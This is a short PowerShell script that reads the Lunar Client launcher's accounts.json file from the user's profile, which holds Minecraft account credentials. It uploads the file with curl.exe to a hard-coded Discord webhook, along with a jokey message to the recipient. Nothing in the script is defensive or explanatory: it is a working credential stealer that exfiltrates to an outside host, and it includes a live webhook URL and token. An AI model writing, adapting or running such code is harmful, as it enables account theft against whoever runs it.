# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Path to the accounts.json file
$filePath = "$env:USERPROFILE\.lunarclient\settings\game\accounts.json"

# Check if the file exists
if (-not (Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit 1
}

Write-Host "Found file: $filePath"
Write-Host "Sending to Discord..."

# Use curl.exe directly - it handles multipart/form-data correctly
$payload = '{"content":"Here you go king :pray:"}'

$result = & curl.exe -s -X POST $webhookUrl `
    -F "payload_json=$payload" `
    -F "file=@$filePath"

if ($LASTEXITCODE -eq 0) {
    Write-Host "File sent successfully!"
} else {
    Write-Host "Error: $result"
}
